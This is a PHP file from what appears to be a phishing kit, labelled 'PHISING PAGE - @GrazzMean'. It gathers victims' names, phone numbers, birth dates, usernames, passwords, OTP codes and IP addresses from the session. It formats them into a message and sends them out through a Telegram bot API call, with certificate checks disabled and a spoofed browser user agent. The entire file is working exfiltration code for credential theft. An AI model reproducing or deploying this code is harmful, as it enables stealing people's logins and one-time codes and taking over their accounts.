<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require 'config.inc.php';

function returnSessionValue($key) {
    if (!isset($_SESSION[$key])) {
        return "";
    } 

    return $_SESSION[$key];
}

function CreateText() {
    // print_r($_SESSION);
    $text = "<b>(PHISING PAGE - @GrazzMean)";
    // if (isset($_SESSION["pageName"])) {
    //     $text .= "\n[+] PAGE NAME : " . $_SESSION['pageName'];
    // } else {
    //     $text .= "\n[+] PAGE NAME : ";
    // }

    $text .= "\n[+] PAGE NAME : " . returnSessionValue('pageName');
    $text .= "\n[+] NAME : " . returnSessionValue('name');
    $text .= "\n[+] PHONE NUMBER : " . returnSessionValue('phoneNumber');
    $text .= "\n[+] BIRTH DAY : " . returnSessionValue('birthDay');
    $text .= "\n[+] USERNAME : " . returnSessionValue('username');
    $text .= "\n[+] PASSWORD : " . returnSessionValue('password');
    $text .= "\n[+] PASSWORD 2 : " . returnSessionValue('password2');
    $text .= "\n[+] OTP : " . returnSessionValue('otp');
    $text .= "\n[+] IP ADDRESS : " . returnSessionValue("ipaddress");
    // if (isset($_SESSION["name"])) {
    //     $text .= "\n[+] NAME : " . $_SESSION['name'];
    // } else {
    //     $text .= "\n[+] NAME : ";
    // }

    // if (isset($_SESSION['phoneNumber'])) {
    //     $text .= "\n[+] PHONE NUMBER : " . $_SESSION["phoneNumber"];
    // } else {
    //     $text .= "\n[+] PHONE NUMBER : ";
    // }

    // if (isset($_SESSION['birthDay'])) {
    //     $text .= "\n[+] BIRTH DAY : " . $_SESSION['birthDay'];
    // } else {
    //     $text .= "\n[+] BIRTH DAY : ";
    // }

    // if (isset($_SESSION["username"])) {
    //     $text .= "\n[+] USERNAME : " . $_SESSION['username'];
    // } else {
    //     $text .= "\n[+] USERNAME : ";
    // }

    // if (isset($_SESSION['password'])) {
    //     $text .= "\n[+] PASSWORD : " . $_SESSION['password'];
    // } else {
    //     $text .= "\n[+] PASSWORD : ";
    // }

    // if (isset($_SESSION['ipaddress'])) {
    //     $text .= "\n[+] IP ADDRESS : " . $_SESSION['ipaddress'];
    // } else {
    //     $text .= "\n[+] IP ADDRESS : ";
    // }

    // if (isset($_SESSION['otp'])) {
    //     $text .= "\n[+] OTP : " . $_SESSION['otp'];
    // } else {
    //     $text .= "\n[+] OTP : ";
    // }

    $text .= "</b>";
    return $text;
}

function create_curl() {
    global $KEY_TELEGRAM_BOT, $CHAT_ID_TELEGRAM_BOT;
    // $text = urlencode("(PHISING PAGE - @GrazzMean)\n\n- USERNAME : " . $username . "\n- PASSWORD : " . $password . "\n- IP ADDRESS : " . $ip );
    // $text = urlencode("<b>(PHISING PAGE - @GrazzMean)\n\n[+] USERNAME : $username\n[+] PASSWORD : $password\n[+] OTP CODE : $otp\n[+] PAGE NAME : $pageName\n[+] NAME : $name\n[+] PHONE NUMBER : $phoneNumber\n[+] BIRTH DAY : $birthDay\n[+] IP : $ip</b>");
    $text = urlencode(CreateText());
    $url = "https://api.telegram.org/bot" . $KEY_TELEGRAM_BOT . "/sendMessage?chat_id=" . $CHAT_ID_TELEGRAM_BOT . "&parse_mode=HTML" . "&text=" . $text;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
}

function sendtotele() {
    // global $KEY_TELEGRAM_BOT, $CHAT_ID_TELEGRAM_BOT;
    // $text = CreateText();
    // $url = "https://api.telegram.org/bot" . $KEY_TELEGRAM_BOT . "/sendMessage?chat_id=" . $CHAT_ID_TELEGRAM_BOT . "&parse_mode=HTML" . "&text=" . $text;
    create_curl();
}

?>

